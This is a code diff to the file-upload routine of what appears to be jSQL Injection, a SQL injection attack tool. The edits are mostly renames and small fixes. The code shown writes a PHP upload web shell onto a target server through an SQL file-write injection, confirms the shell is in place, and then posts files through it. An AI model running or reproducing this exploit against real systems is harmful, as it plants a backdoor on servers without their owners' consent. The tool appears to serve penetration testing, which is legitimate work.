@@ -53,6 +53,7 @@ import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.ConnectionUtil;
 import com.jsql.util.StringUtil;
 import com.jsql.view.scan.ScanListTerminal;
+import com.jsql.view.swing.MediatorGui;
 import com.jsql.view.swing.list.ListItem;
 
 /**
@@ -266,7 +267,7 @@ public class RessourceAccess {
         msgHeader.put(TypeHeader.URL, url);
         msgHeader.put(TypeHeader.POST, "");
         msgHeader.put(TypeHeader.HEADER, "");
-        msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHTTPHeaders(connection));
+        msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHttpHeaders(connection));
         msgHeader.put(TypeHeader.SOURCE, pageSource);
         
         Request request = new Request();
@@ -483,7 +484,7 @@ public class RessourceAccess {
             return;
         }
         
-        String phpShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
+        String sourceShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
         String pathShellFixed = pathFile;
         if (!pathShellFixed.matches(".*/$")) {
@@ -491,13 +492,13 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().vendor.instance().sqlTextIntoFile("<SQLi>"+ phpShellToInject +"<iLQS>", pathShellFixed + FILENAME_UPLOAD)
+            MediatorModel.model().vendor.instance().sqlTextIntoFile("<SQLi>"+ sourceShellToInject +"<iLQS>", pathShellFixed + FILENAME_UPLOAD)
         );
 
         String[] sourcePage = {""};
-        String phpShellInjected;
+        String sourceShellInjected;
         try {
-            phpShellInjected = new SuspendableGetRows().run(
+            sourceShellInjected = new SuspendableGetRows().run(
                 MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
                 sourcePage,
                 false,
@@ -505,7 +506,7 @@ public class RessourceAccess {
                 null
             );
             
-            if ("".equals(phpShellInjected)) {
+            if ("".equals(sourceShellInjected)) {
                 throw new JSqlException("Bad payload integrity: Empty payload");
             }
         } catch(JSqlException e) {
@@ -517,7 +518,7 @@ public class RessourceAccess {
             urlFileFixed = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
         }
         
-        if (phpShellInjected.indexOf(phpShellToInject) > -1) {
+        if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
             LOGGER.info("Upload payload deployed at \""+ urlFileFixed + FILENAME_UPLOAD +"\" in \""+ pathShellFixed + FILENAME_UPLOAD +"\"");
             
             String crLf = "\r\n";
@@ -531,7 +532,9 @@ public class RessourceAccess {
             ) {
 
                 byte[] streamData = new byte[streamToUpload.available()];
-                streamToUpload.read(streamData);
+                if (streamToUpload.read(streamData) == -1) {
+                    throw new JSqlException("Error reading the file");
+                }
                 
                 String headerForm = "";
                 headerForm += "-----------------------------4664151417711" + crLf;
@@ -589,7 +592,7 @@ public class RessourceAccess {
                     msgHeader.put(TypeHeader.URL, urlFileFixed);
                     msgHeader.put(TypeHeader.POST, "");
                     msgHeader.put(TypeHeader.HEADER, "");
-                    msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHTTPHeaders(connection));
+                    msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHttpHeaders(connection));
                     msgHeader.put(TypeHeader.SOURCE, result);
     
                     Request request = new Request();
@@ -747,6 +750,9 @@ public class RessourceAccess {
                 Thread.currentThread().interrupt();
             }
         }
+        
+        // Get back the normal view
+        MediatorModel.model().addObserver(MediatorGui.frame());
         
         MediatorModel.model().isScanning = false;
         MediatorModel.model().setIsStoppedByUser(false);
